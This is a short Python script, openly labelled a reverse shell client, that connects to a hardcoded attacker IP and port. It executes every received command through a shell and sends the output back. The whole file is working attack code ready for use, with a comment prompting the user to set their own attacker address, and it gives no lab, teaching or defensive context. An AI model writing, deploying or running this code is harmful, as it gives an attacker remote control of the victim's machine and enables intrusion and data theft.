# A reverse shell (client) that connects back to the listener.

import socket
import subprocess

# Define attacker's IP and port
ATTACKER_IP = "192.168.1.100"  # Change this to your attacker's IP
ATTACKER_PORT = 4444           # Port to listen on

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Attempt to connect back to the attacker
    try:
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        s.send(b"Connected to Reverse Shell\n")

        while True:
            command = s.recv(1024).decode("utf-8")  # Receive command
            if command.lower() == "exit":          # If "exit", close the shell
                break
            output = subprocess.run(command, shell=True, capture_output=True)
            s.send(output.stdout + output.stderr)  # Send command output back

    except Exception as e:
        s.send(f"Error: {str(e)}\n".encode())
    
    s.close()

reverse_shell()
